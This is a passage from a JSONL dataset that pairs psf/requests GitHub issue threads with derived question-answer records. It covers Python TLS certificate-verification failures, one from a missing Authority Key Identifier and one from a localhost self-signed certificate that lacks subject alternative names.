(_ssl.c:1020)')))\n\nThis is working on versions <=3.12.10\n\n## Reproduction Steps\nUse Windows\nUse corporate Root CA\nRoot CA is trusted  by Windows Cert store\n\nInstall pip-system-certs\n\n```python\nimport requests\nbaseURL = \"www.example.com\"\nthreatSession = requests.Session()\nheaders = {\"Referer\":baseURL}\nr = threatSession.get(baseURL, headers=headers) \n```\n\n## System Information\n\n    $ python -m requests.help\n\nC:\\Program Files\\Python313>python -m requests.help\n{\n  \"chardet\": {\n    \"version\": null\n  },\n  \"charset_normalizer\": {\n    \"version\": \"3.4.2\"\n  },\n  \"cryptography\": {\n    \"version\": \"\"\n  },\n  \"idna\": {\n    \"version\": \"3.10\"\n  },\n  \"implementation\": {\n    \"name\": \"CPython\",\n    \"version\": \"3.12.10\"\n  },\n  \"platform\": {\n    \"release\": \"11\",\n    \"system\": \"Windows\"\n  },\n  \"pyOpenSSL\": {\n    \"openssl_version\": \"\",\n    \"version\": null\n  },\n  \"requests\": {\n    \"version\": \"2.32.4\"\n  },\n  \"system_ssl\": {\n    \"version\": \"30000100\"\n  },\n  \"urllib3\": {\n    \"version\": \"2.4.0\"\n  },\n  \"using_charset_normalizer\": true,\n  \"using_pyopenssl\": false\n}\n\nC:\\Program Files\\Python313>", "role": "body"}, {"id": "c1", "author": "nateprewitt", "timestamp": "2025-06-17T17:11:04Z", "body": "It looks like you already reported this to CPython in https://github.com/python/cpython/issues/135408. This error is coming directly from the version of OpenSSL bundled with Python. I don't immediately see why the update to OpenSSL 3.0.16 would have triggered this, but the cert isn't valid for x509 strict checking because the it's missing the required Authority Key Identifier.\n\nWe should be able to trigger this without Requests. The easiest way would be do some something like:\n\n```python\nimport urllib.request\n\nurl = \"https://threatinsight.proofpoint.com\"\nwith urllib.request.urlopen(url) as response:\n    response.read()\n```\n\nI don't think there's anything in Requests itself that would be triggering this, it's happening either in urllib3, or more likely the standard library through OpenSSL.", "role": "comment"}, {"id": "c2", "author": "DonNeelin", "timestamp": "2025-06-18T13:49:45Z", "body": "Here is the result of running the suggested code:\n```\nPython 3.13.4 (tags/v3.13.4:8a526ec, Jun  3 2025, 17:46:04) [MSC v.1943 64 bit (AMD64)] on win32\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import urllib.request\n>>> url = \"https://threatinsight.proofpoint.com\"\n>>> with urllib.request.urlopen(url) as response:\n...     response.read()\n...\nTraceback (most recent call last):\n  File \"C:\\Program Files\\Python313\\Lib\\urllib\\request.py\", line 1319, in do_open\n    h.request(req.get_method(), req.selector, req.data, headers,\n    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n              encode_chunked=req.has_header('Transfer-encoding'))\n              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Program Files\\Python313\\Lib\\http\\client.py\", line 1338, in request\n    self._send_request(method, url, body, headers, encode_chunked)\n    ~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Program Files\\Python313\\Lib\\http\\client.py\", line 1384, in _send_request\n    self.endheaders(body, encode_chunked=encode_chunked)\n    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Program Files\\Python313\\Lib\\http\\client.py\", line 1333, in endheaders\n    self._send_output(message_body, encode_chunked=encode_chunked)\n    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Program Files\\Python313\\Lib\\http\\client.py\", line 1093, in _send_output\n    self.send(msg)\n    ~~~~~~~~~^^^^^\n  File \"C:\\Program Files\\Python313\\Lib\\http\\client.py\", line 1037, in send\n    self.connect()\n    ~~~~~~~~~~~~^^\n  File \"C:\\Program Files\\Python313\\Lib\\http\\client.py\", line 1479, in connect\n    self.sock = self._context.wrap_socket(self.sock,\n                ~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^\n                                          server_hostname=server_hostname)\n                                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Program Files\\Python313\\Lib\\ssl.py\", line 455, in wrap_socket\n    return self.sslsocket_class._create(\n           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~^\n        sock=sock,\n        ^^^^^^^^^^\n    ...<5 lines>...\n        session=session\n        ^^^^^^^^^^^^^^^\n    )\n    ^\n  File \"C:\\Program Files\\Python313\\Lib\\ssl.py\", line 1076, in _create\n    self.do_handshake()\n    ~~~~~~~~~~~~~~~~~^^\n  File \"C:\\Program Files\\Python313\\Lib\\ssl.py\", line 1372, in do_handshake\n    self._sslobj.do_handshake()\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^\nssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Missing Authority Key Identifier (_ssl.c:1028)\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"<python-input-2>\", line 1, in <module>\n    with urllib.request.urlopen(url) as response:\n         ~~~~~~~~~~~~~~~~~~~~~~^^^^^\n  File \"C:\\Program Files\\Python313\\Lib\\urllib\\request.py\", line 189, in urlopen\n    return opener.open(url, data, timeout)\n           ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Program Files\\Python313\\Lib\\urllib\\request.py\", line 489, in open\n    response = self._open(req, data)\n  File \"C:\\Program Files\\Python313\\Lib\\urllib\\request.py\", line 506, in _open\n    result = self._call_chain(self.handle_open, protocol, protocol +\n                              '_open', req)\n  File \"C:\\Program Files\\Python313\\Lib\\urllib\\request.py\", line 466, in _call_chain\n    result = func(*args)\n  File \"C:\\Program Files\\Python313\\Lib\\urllib\\request.py\", line 1367, in https_open\n    return self.do_open(http.client.HTTPSConnection, req,\n           ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n                        context=self._context)\n                        ^^^^^^^^^^^^^^^^^^^^^^\n  File \"C:\\Program Files\\Python313\\Lib\\urllib\\request.py\", line 1322, in do_open\n    raise URLError(err)\nurllib.error.URLError: <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Missing Authority Key Identifier (_ssl.c:1028)>\n>>>\n```", "role": "comment"}], "qa_pairs": [{"qid": "psf/requests/issue/6974#1", "question": "On Windows 11 with Python 3.13.x, requests 2.32.4, urllib3 2.4.0, charset_normalizer 3.4.2, idna 3.10, system_ssl 30000100, and pip-system-certs installed, I am using a corporate Root CA that is trusted by the Windows certificate store. Accessing external HTTPS sites using requests with pip-system-certs and/or a defined cacert that includes the entire certificate path fails in all Python 3.13 versions, but works on Python <= 3.12.10.\n\nExample failure:\n\n```python\nr = threatSession.get(baseURL + \"/auth/new\", headers=headers) #, headers = {\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36\"})\n```\n\nTraceback:\n\n```text\nFile \"C:\\Program Files\\Python313\\Lib\\site-packages\\requests\\sessions.py\", line 602, in get\nreturn self.request(\"GET\", url, **kwargs)\n~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^\nFile \"C:\\Program Files\\Python313\\Lib\\site-packages\\requests\\sessions.py\", line 589, in request\nresp = self.send(prep, **send_kwargs)\nFile \"C:\\Program Files\\Python313\\Lib\\site-packages\\requests\\sessions.py\", line 703, in send\nr = adapter.send(request, **kwargs)\nFile \"C:\\Program Files\\Python313\\Lib\\site-packages\\requests\\adapters.py\", line 698, in send\nraise SSLError(e, request=request)\nrequests.exceptions.SSLError: HTTPSConnectionPool(host='threatinsight.proofpoint.com', port=443): Max retries exceeded with url: /auth/new (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Missing Authority Key Identifier (_ssl.c:1020)')))\n```\n\nReproduction steps:\n\n1. Use Windows.\n2. Use a corporate Root CA.\n3. Root CA is trusted by Windows Cert store.\n4. Install pip-system-certs.\n\n```python\nimport requests\nbaseURL = \"www.example.com\"\nthreatSession = requests.Session()\nheaders = {\"Referer\":baseURL}\nr = threatSession.get(baseURL, headers=headers) \n```\n\n`python -m requests.help` output shown from `C:\\Program Files\\Python313`:\n\n```json\n{\n  \"chardet\": {\n    \"version\": null\n  },\n  \"charset_normalizer\": {\n    \"version\": \"3.4.2\"\n  },\n  \"cryptography\": {\n    \"version\": \"\"\n  },\n  \"idna\": {\n    \"version\": \"3.10\"\n  },\n  \"implementation\": {\n    \"name\": \"CPython\",\n    \"version\": \"3.12.10\"\n  },\n  \"platform\": {\n    \"release\": \"11\",\n    \"system\": \"Windows\"\n  },\n  \"pyOpenSSL\": {\n    \"openssl_version\": \"\",\n    \"version\": null\n  },\n  \"requests\": {\n    \"version\": \"2.32.4\"\n  },\n  \"system_ssl\": {\n    \"version\": \"30000100\"\n  },\n  \"urllib3\": {\n    \"version\": \"2.4.0\"\n  },\n  \"using_charset_normalizer\": true,\n  \"using_pyopenssl\": false\n}\n```\n\nIs this SSL `CERTIFICATE_VERIFY_FAILED: Missing Authority Key Identifier` failure being caused by Requests, and how can I verify where it is coming from?", "answer": "This appears to be the same problem already reported to CPython in https://github.com/python/cpython/issues/135408. The error is coming directly from the OpenSSL version bundled with Python; the certificate is not valid for x509 strict checking because it is missing the required Authority Key Identifier. The maintainer did not think Requests itself was triggering it; it should be reproducible without Requests using `urllib.request.urlopen`, meaning it is happening either in urllib3 or more likely in the standard library through OpenSSL.", "knowledge_type": "grounded", "grounding_sources": ["https://github.com/python/cpython/issues/135408", "OpenSSL bundled with Python", "urllib.request.urlopen"], "answer_grounded_in": "c1", "leak_flags": []}], "answer_in_thread_refs": ["https://github.com/python/cpython/issues/135408", "https://threatinsight.proofpoint.com"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-17T07:05:40.186361Z", "review_note": ""}
{"id": "psf/requests/issue/6969", "repo": "psf/requests", "number": 6969, "title": "Hostname mismatch with self signed cert on localhost", "url": "https://github.com/psf/requests/issues/6969", "state": "closed", "created_at": "2025-06-12T16:24:18Z", "closed_at": "2025-06-13T14:21:48Z", "labels": ["Question/Not a bug"], "reporter": "graydenshand", "security_topic": "hostname verification failure for self\u2011signed certificate", "qa_summary": "The developer needed to know why hostname verification fails with a self\u2011signed cert on localhost\u2014due to missing SANs and using a CA certificate instead of a leaf\u2014and the answer points to the project's test suite in the repository as the source for the correct certificate generation method.", "question_comment_id": "c0", "answer_comment_id": "c2", "question_author": "graydenshand", "answer_author": "sigmavirus24", "answerer_role": "maintainer", "artifacts_needed": ["code", "documentation"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": [], "advisory_urls": []}, "human_note": "Accepted because the question is about TLS hostname verification and the answer correctly identifies certificate misconfiguration with a concrete reference to correct implementation practices.", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "graydenshand", "timestamp": "2025-06-12T16:24:18Z", "body": "<!-- Summary. -->\n\nI'm running web server over SSL on localhost, using a certificate generated with openssl.\n\n```\nopenssl req -x509 -newkey rsa:4096 -nodes -out ssl/cert.pem -keyout ssl/key.pem -days 365\n....\nCountry Name (2 letter code) [AU]:\nState or Province Name (full name) [Some-State]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:localhost\nEmail Address []:\n```\n\nI can verify this certificate is correctly configured by using `curl`.\n\n```\n$ curl https://localhost:5000 --cacert ssl/cert.pem                              \nOK%                                                                             \n```\n\n## Expected Result\n\n<!-- What you expected. -->\n\nWhen I make a similar request using the `requests` module, I would expect the request to succeed.\n\n```python\n>>> import requests\n>>> r = requests.get(\"https://localhost:5000\", verify=\"./ssl/cert.pem\")\n>>> assert r.text == \"OK\"\n```\n\n## Actual Result\n\n<!-- What happened instead. -->\n```python\n>>> import requests\n>>> requests.get(\"https://localhost:5000\", verify=\"./ssl/cert.pem\")\nTraceback (most recent call last):\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py\", line 464, in _make_request\n    self._validate_conn(conn)\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py\", line 1093, in _validate_conn\n    conn.connect()\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connection.py\", line 741, in connect\n    sock_and_verified = _ssl_wrap_socket_and_match_hostname(\n                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connection.py\", line 920, in _ssl_wrap_socket_and_match_hostname\n    ssl_sock = ssl_wrap_socket(\n               ^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/util/ssl_.py\", line 480, in ssl_wrap_socket\n    ssl_sock = _ssl_wrap_socket_impl(sock, context, tls_in_tls, server_hostname)\n               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/util/ssl_.py\", line 524, in _ssl_wrap_socket_impl\n    return ssl_context.wrap_socket(sock, server_hostname=server_hostname)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/home/.pyenv/versions/3.12.8/lib/python3.12/ssl.py\", line 455, in wrap_socket\n    return self.sslsocket_class._create(\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/home/.pyenv/versions/3.12.8/lib/python3.12/ssl.py\", line 1041, in _create\n    self.do_handshake()\n  File \"/home/.pyenv/versions/3.12.8/lib/python3.12/ssl.py\", line 1319, in do_handshake\n    self._sslobj.do_handshake()\nssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py\", line 787, in urlopen\n    response = self._make_request(\n               ^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py\", line 488, in _make_request\n    raise new_e\nurllib3.exceptions.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)\n\nThe above exception was the direct cause of the following exception:\n\nTraceback (most recent call last):\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/adapters.py\", line 668, in send\n    resp = conn.urlopen(\n           ^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py\", line 841, in urlopen\n    retries = retries.increment(\n              ^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/util/retry.py\", line 519, in increment\n    raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]\n    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nurllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='localhost', port=5000): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, \"[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)\")))\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/api.py\", line 73, in get\n    return request(\"get\", url, params=params, **kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/api.py\", line 59, in request\n    return session.request(method=method, url=url, **kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/sessions.py\", line 589, in request\n    resp = self.send(prep, **send_kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/sessions.py\", line 703, in send\n    r = adapter.send(request, **kwargs)\n        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/adapters.py\", line 699, in send\n    raise SSLError(e, request=request)\nrequests.exceptions.SSLError: HTTPSConnectionPool(host='localhost', port=5000): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, \"[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)\")))\n```\n\n## Reproduction Steps\n\n1. Create a new cert and key\n\n```\nopenssl req -x509 -newkey rsa:4096 -nodes -out ssl/cert.pem -keyout ssl/key.pem -days 365\n....\nCountry Name (2 letter code) [AU]:\nState or Province Name (full name) [Some-State]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:localhost\nEmail Address []:\n```\n\n2. Run a web server that uses the key. Here's a simple flask application you can use.\n\n```python\n# app.py\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef index():\n    return \"OK\"\n```\n\nRun the application with:\n```\nflask run --cert ssl/cert.pem --key ssl/key.pem\n```\n\n3. Attempt to make a request\n\n```python\nimport requests\nrequests.get(\"https://localhost:5000\", verify=\"./ssl/cert.pem\")\n```\n\n\n## System Information\n\n    $ python -m requests.help\n\n```json\n{\n  \"chardet\": {\n    \"version\": null\n  },\n  \"charset_normalizer\": {\n    \"version\": \"3.4.2\"\n  },\n  \"cryptography\": {\n    \"version\": \"45.0.4\"\n  },\n  \"idna\": {\n    \"version\": \"3.10\"\n  },\n  \"implementation\": {\n    \"name\": \"CPython\",\n    \"version\": \"3.12.8\"\n  },\n  \"platform\": {\n    \"release\": \"24.5.0\",\n    \"system\": \"Darwin\"\n  },\n  \"pyOpenSSL\": {\n    \"openssl_version\": \"30500000\",\n    \"version\": \"25.1.0\"\n  },\n  \"requests\": {\n    \"version\": \"2.32.3\"\n  },\n  \"system_ssl\": {\n    \"version\": \"30400010\"\n  },\n  \"urllib3\": {\n    \"version\": \"2.4.0\"\n  },\n  \"using_charset_normalizer\": true,\n  \"using_pyopenssl\": true\n}\n```\n\n<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,\nplease provide some basic information about your system (Python version,\noperating system, &c). -->\n", "role": "body"}, {"id": "c1", "author": "graydenshand", "timestamp": "2025-06-13T11:50:12Z", "body": "```sh\n$ openssl x509 -in ssl/cert.pem -noout -text\nCertificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number:\n            5f:ac:7c:61:61:28:e3:90:9d:cb:3b:da:0d:62:e8:a5:9f:90:a7:6e\n        Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd, CN=localhost\n        Validity\n            Not Before: Jun 13 11:50:51 2025 GMT\n            Not After : Jun 13 11:50:51 2026 GMT\n        Subject: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd, CN=localhost\n        Subject Public Key Info:\n            Public Key Algorithm: rsaEncryption\n                Public-Key: (4096 bit)\n                Modulus:\n                    00:ad:9d:1e:f9:92:eb:26:db:0f:ee:26:48:9b:51:\n                    d1:a6:3b:17:22:f2:81:7f:25:56:22:8e:36:d0:47:\n                    ad:00:af:f6:10:89:d5:e2:f9:a4:96:91:29:a5:9b:\n                    00:35:2d:a3:53:db:0d:d9:50:b4:f6:8d:92:25:32:\n                    fc:cf:0e:05:78:33:f5:f2:60:c4:ae:19:56:8e:ae:\n                    c9:76:b6:fc:e2:62:8a:7b:ea:0c:a5:44:30:2e:78:\n                    81:13:36:c1:0d:11:a5:7f:1f:b4:60:7e:7c:b4:e0:\n                    36:01:cf:50:ec:c0:3d:02:3e:97:4d:31:a0:3d:15:\n                    b4:83:7f:59:c5:a7:57:8b:4f:c0:46:de:2b:49:72:\n                    a6:64:f3:9c:79:98:41:a7:47:57:2d:21:ce:8c:ec:\n                    40:99:1b:3d:de:e6:47:a1:c0:55:cd:32:07:58:1b:\n                    12:69:63:d4:52:97:21:c8:14:7d:46:d8:3d:44:02:\n                    b6:cd:9c:14:9c:86:bc:85:b9:05:fd:06:7d:1c:98:\n                    30:e9:8b:a0:00:a6:27:d8:19:ff:a8:b9:05:ab:37:\n                    5b:d6:5d:f5:4d:da:59:d5:5a:5c:5d:0d:9a:0c:dd:\n                    cd:58:43:5a:36:b2:1f:3f:0f:35:6b:fd:b6:c7:cd:\n                    b0:1d:d7:0b:ba:d7:77:f6:02:8b:fa:be:1e:38:7a:\n                    ad:f5:f2:39:61:1f:b6:6c:af:b0:a8:46:63:4b:8d:\n                    f4:b6:18:2d:2c:11:91:e8:58:9b:76:1a:22:d7:7f:\n                    ff:59:cb:87:47:46:64:1a:e3:b8:c4:e5:a2:dc:dd:\n                    c1:8c:76:b8:15:cd:fe:14:7b:a9:aa:85:6d:fb:73:\n                    b8:07:8f:59:4f:3e:72:c8:77:26:cd:51:f2:2e:a2:\n                    b2:4a:1c:d8:74:d1:af:73:b1:fb:d6:19:5e:99:90:\n                    bb:bc:ce:64:99:49:12:c7:af:03:c3:1c:22:ba:a5:\n                    2f:32:78:04:a2:2a:90:b0:14:87:b4:2c:06:60:b6:\n                    de:96:e7:9d:22:ce:e7:0d:d7:65:27:0e:86:36:8d:\n                    5e:a6:b7:12:ea:18:50:27:26:c0:de:5f:4b:29:96:\n                    1e:59:fb:fd:a7:23:20:16:73:b1:fe:90:c0:40:86:\n                    0b:eb:67:ef:61:62:e1:13:55:29:4c:fb:d3:d7:ca:\n                    3b:df:7e:02:10:5f:89:d0:7d:51:65:f6:ad:2e:17:\n                    06:00:71:0c:71:ae:75:4a:c9:25:c9:99:2c:a5:ff:\n                    00:5f:6c:ba:78:4a:d5:46:b7:2f:5d:2d:58:1c:3e:\n                    15:ee:42:69:0e:ca:dc:13:3f:91:85:5e:1a:96:e7:\n                    66:83:9d:48:c9:08:7e:ff:1f:1c:fe:32:4b:fb:06:\n                    40:e1:a3\n                Exponent: 65537 (0x10001)\n        X509v3 extensions:\n            X509v3 Subject Key Identifier: \n                37:43:F4:55:2D:84:5F:46:76:4F:53:45:28:D0:D9:8C:99:95:30:23\n            X509v3 Authority Key Identifier: \n                37:43:F4:55:2D:84:5F:46:76:4F:53:45:28:D0:D9:8C:99:95:30:23\n            X509v3 Basic Constraints: critical\n                CA:TRUE\n    Signature Algorithm: sha256WithRSAEncryption\n    Signature Value:\n        5c:64:f6:60:1b:97:8e:34:47:4b:a6:63:67:8c:2e:a5:14:3d:\n        69:2b:d2:70:95:ae:54:eb:aa:20:e4:25:98:92:a1:6d:7f:09:\n        9e:27:87:3b:bc:0c:ce:35:90:a5:14:e9:33:66:8e:5b:4f:e6:\n        45:b8:af:7e:ac:ee:ae:be:ff:6a:97:b9:50:02:03:73:85:40:\n        28:46:9c:83:53:e6:79:48:6d:fc:af:eb:e8:fb:4a:4a:26:81:\n        50:7d:ea:b6:08:0d:e5:96:14:76:f9:c8:82:46:c2:b9:d6:bb:\n        28:f3:c0:b6:75:30:79:32:b7:a3:8c:83:c4:4f:71:bd:90:7c:\n        21:64:da:ce:92:15:c4:d3:2b:2d:0c:08:50:32:f5:eb:7d:78:\n        36:bb:fb:38:df:6e:3b:cd:a0:cd:3a:bd:e2:79:fb:98:06:a0:\n        d6:38:c4:13:0d:d0:3e:5f:52:c5:8f:e0:42:9b:4e:e4:4c:37:\n        ad:b1:28:ec:e0:4a:57:21:ff:1f:de:0e:ca:19:bf:2c:f0:f8:\n        aa:ae:be:5d:65:93:29:14:9d:35:14:10:11:9b:12:0d:a6:e7:\n        39:31:a6:e4:48:4f:50:41:06:b8:92:ff:a6:b1:74:a7:cb:05:\n        5e:a3:bf:1b:23:00:92:74:83:c2:3a:2f:e1:0a:fc:a0:77:74:\n        19:08:dc:f1:9b:7a:9e:a3:6c:bc:e9:0d:30:dc:8d:1f:f8:3d:\n        36:e7:e5:ec:db:f0:7b:53:36:2b:6a:d0:08:8c:2f:ce:e1:7b:\n        7d:f3:61:5c:f3:c5:c1:3e:ca:86:2c:4a:0a:4d:52:3b:47:f0:\n        95:7a:bc:89:1d:c4:e0:f6:2a:94:33:a7:d8:c5:f2:58:94:93:\n        f1:6e:b8:bf:a3:e6:8f:cd:8b:53:6b:cb:e0:6c:82:36:dd:50:\n        ab:e4:14:59:6f:21:a0:36:89:37:48:b0:51:e3:ff:dc:b5:7c:\n        65:c5:f3:b4:18:d7:4b:e9:70:76:2a:c4:59:9c:e9:fa:fe:75:\n        c9:b9:e6:07:a2:7f:9a:9c:23:61:f4:e2:ff:b2:08:64:46:91:\n        09:d2:68:a8:e9:b0:e2:5b:20:1f:17:04:ca:a7:ea:48:e2:3f:\n        e8:06:80:91:09:04:48:1c:f0:13:02:ff:6c:4e:a4:74:39:42:\n        e2:a8:e8:e5:b0:31:70:2b:c2:37:eb:e7:02:a7:75:ad:88:51:\n        b3:74:21:8e:e7:7a:6f:91:64:47:5e:9a:cf:d9:e4:4d:d3:69:\n        e2:47:22:d3:a6:08:45:36:2e:09:ea:1c:70:b5:62:e5:ed:ba:\n        41:c3:6c:8c:0a:ce:ca:fc:17:25:be:aa:5b:4f:6d:07:c1:bd:\n        56:ab:5a:65:d1:4b:6b:b1\n```", "role": "comment"}, {"id": "c2", "author": "sigmavirus24", "timestamp": "2025-06-13T14:21:18Z", "body": "So there is no subject alternative names specified and you created a CA certificate, not a leaf. Take a look in our repo under the tests to see how we generate these correctly. \n\nI'm guessing curl just falls back to using the CN but that is no longer best practice and hasn't been for years", "role": "comment"}], "qa_pairs": [{"qid": "psf/requests/issue/6969#1", "question": "I'm running a Flask web server over SSL on localhost using a self-signed certificate generated with OpenSSL, where I set the Common Name to `localhost`:\n\n```\nopenssl req -x509 -newkey rsa:4096 -nodes -out ssl/cert.pem -keyout ssl/key.pem -days 365\n....\nCountry Name (2 letter code) [AU]:\nState or Province Name (full name) [Some-State]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:localhost\nEmail Address []:\n```\n\n`curl` succeeds when I trust that cert:\n\n```\n$ curl https://localhost:5000 --cacert ssl/cert.pem                              \nOK%                                                                             \n```\n\nBut Python Requests fails. Expected:\n\n```python\n>>> import requests\n>>> r = requests.get(\"https://localhost:5000\", verify=\"./ssl/cert.pem\")\n>>> assert r.text == \"OK\"\n```\n\nActual:\n\n```python\n>>> import requests\n>>> requests.get(\"https://localhost:5000\", verify=\"./ssl/cert.pem\")\nTraceback (most recent call last):\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py\", line 464, in _make_request\n    self._validate_conn(conn)\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py\", line 1093, in _validate_conn\n    conn.connect()\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connection.py\", line 741, in connect\n    sock_and_verified = _ssl_wrap_socket_and_match_hostname(\n                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connection.py\", line 920, in _ssl_wrap_socket_and_match_hostname\n    ssl_sock = ssl_wrap_socket(\n               ^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/util/ssl_.py\", line 480, in ssl_wrap_socket\n    ssl_sock = _ssl_wrap_socket_impl(sock, context, tls_in_tls, server_hostname)\n               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/util/ssl_.py\", line 524, in _ssl_wrap_socket_impl\n    return ssl_context.wrap_socket(sock, server_hostname=server_hostname)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/home/.pyenv/versions/3.12.8/lib/python3.12/ssl.py\", line 455, in wrap_socket\n    return self.sslsocket_class._create(\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/home/.pyenv/versions/3.12.8/lib/python3.12/ssl.py\", line 1041, in _create\n    self.do_handshake()\n  File \"/home/.pyenv/versions/3.12.8/lib/python3.12/ssl.py\", line 1319, in do_handshake\n    self._sslobj.do_handshake()\nssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py\", line 787, in urlopen\n    response = self._make_request(\n               ^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py\", line 488, in _make_request\n    raise new_e\nurllib3.exceptions.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate 